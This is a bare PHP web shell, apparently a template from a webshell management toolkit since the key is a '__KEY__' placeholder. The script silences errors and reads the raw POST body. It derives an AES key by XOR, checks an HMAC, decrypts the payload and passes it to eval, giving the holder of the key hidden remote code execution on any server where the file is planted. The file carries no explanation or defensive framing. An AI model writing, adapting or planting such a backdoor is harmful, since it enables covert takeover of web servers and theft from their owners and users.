<?php
@session_start();
@error_reporting(0);
@ini_set('display_errors', '0');

function Decrypt($data) {

    if (!function_exists('openssl_decrypt')) {
        return "";
    }

    $prefixLen = 68;
    if (strlen($data) <= $prefixLen + 48) {
        return "";
    }
    
    $encrypted = substr($data, $prefixLen);
    
    $key = "__KEY__";
    $raw = unpack('C*', $key);
    $raw = $raw ? array_values($raw) : [];
    $rawLen = count($raw);
    if ($rawLen === 0) return "";
    
    $aesKey = "";
    for ($i = 0; $i < 16; $i++) {
        $aesKey .= chr($raw[$i % $rawLen] ^ 0x1F);
    }
    
    $iv = substr($encrypted, 0, 16);
    $tag = substr($encrypted, -32);
    $body = substr($encrypted, 16, -32);
    

    if ($iv === false || $tag === false || $body === false) {
        return "";
    }
    
    $macData = $iv . $body;
    $check = hash_hmac('sha256', $macData, $aesKey, true);
    
    if ($check !== $tag) {
        return ""; 
    }
    
    return openssl_decrypt($body, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $postData = file_get_contents("php://input");
    if (!empty($postData)) {
        $deMsg = Decrypt($postData);
        if (!empty($deMsg)) {
            try {
                @eval($deMsg);
            } catch (\Throwable $e) {

            }
        }
    }
}
?>
